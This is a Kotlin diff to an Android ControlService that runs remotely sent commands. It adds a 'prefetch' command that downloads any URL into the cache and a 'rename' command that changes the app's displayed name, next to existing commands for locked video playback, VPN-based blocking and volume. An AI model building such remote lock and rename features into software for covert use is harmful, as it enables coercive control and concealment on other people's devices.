@@ -11,6 +11,10 @@ import kotlinx.coroutines.*
 import okhttp3.OkHttpClient
 import okhttp3.Request
 import org.json.JSONObject
+import java.io.File
+import java.io.FileOutputStream
+import java.net.HttpURLConnection
+import java.net.URL
 import java.util.concurrent.TimeUnit
 
 class ControlService : Service() {
@@ -131,12 +135,46 @@ class ControlService : Service() {
                     "unban"         -> stopVpnBlock()
                     "video"         -> VideoActivity.startBuiltin(this@ControlService, cmd.optInt("num", 1), lock, duration)
                     "play_raw"      -> VideoActivity.startFromUrl(this@ControlService, cmd.optString("url"), lock, duration)
+                    "prefetch"      -> prefetchVideo(cmd.optString("url"))
                     "delete_video"  -> deleteVideoCache(cmd.optString("url"))
                     "sound"         -> setVolume(cmd.optInt("level", 5))
                     "unban_video"   -> VideoActivity.unlock()
+                    "rename"        -> AppNameHelper.rename(this@ControlService, cmd.optString("name"))
                 }
             } catch (e: Exception) {
                 Log.e(TAG, "Command failed: ${e.message}")
+            }
+        }
+    }
+
+    private fun prefetchVideo(url: String) {
+        if (url.isEmpty()) return
+        val cacheFile = VideoActivity.getCacheFile(this, url)
+        if (cacheFile.exists() && cacheFile.length() > 0) {
+            Log.d(TAG, "prefetch: already cached")
+            return
+        }
+        scope.launch {
+            try {
+                Log.d(TAG, "prefetch start: $url")
+                val connection = URL(url).openConnection() as HttpURLConnection
+                connection.connectTimeout = 15_000
+                connection.readTimeout = 60_000
+                connection.instanceFollowRedirects = true
+                connection.setRequestProperty("User-Agent", "Mozilla/5.0")
+                connection.connect()
+                val tmp = File(cacheDir, "tmp_prefetch_${System.currentTimeMillis()}.mp4")
+                connection.inputStream.use { input ->
+                    FileOutputStream(tmp).use { output ->
+                        val buf = ByteArray(8192)
+                        var read: Int
+                        while (input.read(buf).also { read = it } != -1) output.write(buf, 0, read)
+                    }
+                }
+                tmp.renameTo(cacheFile)
+                Log.d(TAG, "prefetch done: ${cacheFile.path}")
+            } catch (e: Exception) {
+                Log.e(TAG, "prefetch failed: ${e.message}")
             }
         }
     }
